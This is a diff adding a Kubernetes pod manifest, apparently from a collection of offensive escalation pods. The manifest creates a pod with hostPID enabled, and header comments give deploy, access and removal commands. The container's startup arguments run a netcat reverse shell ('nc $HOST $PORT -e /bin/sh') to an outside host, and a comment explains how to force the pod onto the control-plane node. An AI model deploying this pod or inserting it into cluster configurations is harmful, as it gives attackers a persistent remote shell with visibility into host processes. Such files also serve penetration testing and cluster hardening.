@@ -1,0 +1,22 @@
+###########################################################
+## Deploy: kubectl -n [namespace] apply -f pod-hostpid-only.yaml 
+## Access: kubectl -n [namespace] exec -it pod-hostpid -- bash
+## Remove: kubectl -n [namespace] delete -f pod-hostpid-only.yaml
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-hostpid
+  labels:
+    app: hostpid
+spec:
+  hostPID: true
+  containers:
+  - image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+    imagePullPolicy: IfNotPresent
+    name: hostpid
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  restartPolicy: Always
